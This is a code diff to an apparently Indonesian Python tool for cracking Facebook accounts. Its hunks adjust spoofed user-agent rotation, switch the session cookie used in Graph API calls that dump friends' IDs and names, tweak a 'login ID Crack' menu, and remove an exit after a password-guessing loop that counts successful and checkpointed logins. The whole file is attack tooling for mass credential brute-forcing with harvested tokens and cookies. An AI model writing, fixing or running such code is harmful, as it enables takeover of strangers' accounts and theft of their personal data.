@@ -95,7 +95,7 @@ for xd in range(10000):
 	zax5=f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
 	aseph=f'Mozilla/5.0 (Windows NT 10.0; {crot} AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Safari/537.36 Edge/12.{t}'
 	hi=f'Mozilla/5.0 (Linux; Android 10; Infinix X682B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36{model}'
-	uaku2 = random.choice([zax1,zax2,zax3,zax4,zax5,aseph,hi])
+	uaku2 = random.choice([zax1,zax2,zax3,zax5,aseph])
 	ugen.append(uaku2)
 def uaku():
 	try:
@@ -466,7 +466,7 @@ def dump(idt,fields,cookie,token):
 				"access_token": token,
 				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
 			}
-		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
+		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cok).json()
 		for i in url["friends"]["data"]:
 			#print(i["id"]+"|"+i["name"])
 			id.append(i["id"]+"|"+i["name"])
@@ -739,7 +739,7 @@ def massal():
 	           'fields': "friends"
 	           }	           
 	       )
-	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies=cookie).json()
+	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies=cok).json()
 	       for xr in url['friends']['data']:
 	           try:
 	               woy = (xr['id']+'|'+xr['name'])
@@ -801,7 +801,7 @@ def Dump_Massal():
 		back()
 ###----------[ ATUR SBLUM KREK ]----------###
 def setting():
-	cetak(nel(f"                        [bold blue]login ID Crack", title=f"    {asu}{len(id)}{B} ID TELAH DIKUMPULKAN", style=f"bold purple"))
+	cetak(nel(f"                        [bold blue]login ID Crack", title=f"{asu}{len(id)}{B} ID TELAH DIKUMPULKAN", width=70,padding=(0,7), style=f"bold purple"))
 	print(f"{H2}╰─▶ {B2}01 [bold purple]Facebook ID {M2}Old\n")
 	print(f"{H2}╰─▶ {B2}02 [bold purple]Facebook ID {K2}New\n")
 	print(f"{H2}╰─▶ {B2}03 [bold purple]Facebook ID {H2}Random\n")
@@ -926,7 +926,6 @@ def passwrd():
 				pool.submit(rr071,idf,pwv)
 	print(f'[•]{H2} OK : {H2}%s '%(ok))
 	print(f'[•]{K2} CP : {K2}%s '%(cp))
-	exit()
 #-------------------[ METODE-B-API ]-----------------#
 def rr071(idf,pwv):
 	global loop,ok,cp
